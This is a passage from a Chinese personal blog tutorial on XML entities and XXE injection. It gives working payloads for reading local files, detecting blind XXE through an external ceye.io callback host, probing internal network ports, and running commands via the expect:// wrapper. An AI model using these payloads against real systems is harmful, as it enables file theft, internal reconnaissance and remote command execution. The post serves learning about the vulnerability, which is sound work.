<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 文件名 [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">定义好的ENTITY在文档中通过“&amp;实体名;”来使用。举例：</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE booklist [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY publisher &quot;ABC company&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;booklist&gt;</span><br><span class="line"></span><br><span class="line">&lt;book&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;Ajax&lt;&#x2F;name&gt;</span><br><span class="line"></span><br><span class="line">&lt;price&gt;$5.95&lt;&#x2F;price&gt;</span><br><span class="line"></span><br><span class="line">&lt;description&gt;Foundations of Ajax.&lt;&#x2F;description&gt;</span><br><span class="line"></span><br><span class="line">&lt;publisher&gt;&amp;publisher;&lt;&#x2F;publisher&gt;  这里的&amp;publisher;会被“ABC company”替换</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;book&gt;</span><br><span class="line"></span><br><span class="line">&lt;book&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;Ajax Patterns&lt;&#x2F;name&gt;</span><br><span class="line"></span><br><span class="line">&lt;price&gt;$7.95&lt;&#x2F;price&gt;</span><br><span class="line"></span><br><span class="line">&lt;description&gt;Introduction of Ajax Patterns.&lt;&#x2F;description&gt;</span><br><span class="line"></span><br><span class="line">&lt;publisher&gt;&amp;publisher;&lt;&#x2F;publisher&gt; 这里的&amp;publisher;会被“ABC company”替换</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;book&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;booklist&gt;</span><br></pre></td></tr></table></figure>

<p>在 XML 中有 5 个预定义的实体引用：</p>
<table>
<thead>
<tr>
<th>&lt;</th>
<th>&lt;</th>
<th>小于</th>
</tr>
</thead>
<tbody><tr>
<td>&gt;</td>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&amp;</td>
<td>&amp;</td>
<td>和号</td>
</tr>
<tr>
<td>&apos;</td>
<td>‘</td>
<td>省略号</td>
</tr>
<tr>
<td>&quot;</td>
<td>“</td>
<td>引号</td>
</tr>
</tbody></table>
<p>注释：严格地讲，在 XML 中仅有字符 “&lt;”和”&amp;” 是非法的。省略号、引号和大于号是合法的，但是把它们替换为实体引用是个好的习惯。</p>
<h2 id="7-XXE漏洞原理"><a href="#7-XXE漏洞原理" class="headerlink" title="7.XXE漏洞原理"></a>7.XXE漏洞原理</h2><p>既然XML可以从外部读取DTD文件，那我们就自然地想到了如果将路径换成另一个文件的路径，那么服务器在解析这个XML的时候就会把那个文件的内容赋值给SYSTEM前面的根元素中，只要我们在XML中让前面的根元素的内容显示出来，不就可以读取那个文件的内容了。这就造成了一个任意文件读取的漏洞。</p>
<p>那如果我们指向的是一个内网主机的端口呢？是否会给出错误信息，我们是不是可以从错误信息上来判断内网主机这个端口是否开放，这就造成了一个内部端口被探测的问题。另外，一般来说，服务器解析XML有两种方式，一种是一次性将整个XML加载进内存中，进行解析；另一种是一部分一部分的、“流式”地加载、解析。如果我们递归地调用XML定义，一次性调用巨量的定义，那么服务器的内存就会被消耗完，造成了拒绝服务攻击。</p>
<h2 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1.任意文件读取"></a>1.任意文件读取</h2><p>payload如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;&#x2F;phpStudy&#x2F;&#x2F;WWW&#x2F;&#x2F;aa.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>读取aa.txt的内容:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955047-1196767811.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<h2 id="2-探测sql盲注"><a href="#2-探测sql盲注" class="headerlink" title="2.探测sql盲注"></a>2.探测sql盲注</h2><p>一般在漏洞挖掘中我们是猜测不到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;root&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>里面是name标签的。所以我们用另一种方法更靠谱:推荐网站:<a target="_blank" rel="noopener" href="http://ceye.io/payloads">http://ceye.io/payloads</a></p>
<p>找到网站上自带的XML注入利用代码:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955469-519270664.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>稍微整理下生成payload如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;9j4jd9.ceye.io&#x2F;xxe_test&quot;&gt;</span><br><span class="line"></span><br><span class="line">%remote;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&#x2F;&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;9j4jd9.ceye.io&#x2F;xxe_test&quot;&gt;</span><br><span class="line"></span><br><span class="line">%remote;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>看下现在是几点钟:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955858-717215866.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p> 晚上八点多钟,我们复制payload发送请求:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233956543-443383052.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>看下网站里面自带的日志功能:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233957447-1571114973.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>应该是时间延迟问题。反正相差十分钟以内!</p>
<p>这里接收到我们的payload请求说明是存在XML注入的，用这种方法测试XML注入我感觉很好</p>
<p>1.可以无限制盲打</p>
<p>2.测试简单方便不需要很繁琐测试猜测</p>
<h2 id="3-探测内网地址"><a href="#3-探测内网地址" class="headerlink" title="3.探测内网地址"></a>3.探测内网地址</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload如下:</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.100:80&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>成功探测到内网端口内部信息。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233957877-1657490227.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>我这是在windows下测试，假如是linux下还可以命令执行:</p>
<p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</p>
<p>测试payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;ifconfig&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>这里读取系统命令ifconfig读取ip</p>
<p>参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
<p>大致学习一下XML的一些语法以及XML的注入漏洞</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">vague huang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/04/10/xml注入与xxe注入基础知识/">http://example.com/2021/04/10/xml注入与xxe注入基础知识/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/04/11/buuctf8/"><i class="fa fa-chevron-left">  </i><span>buuctf8</span></a></div><div class="next-post pull-right"><a href="/2021/04/09/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"><span>python代码审计基础语法</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>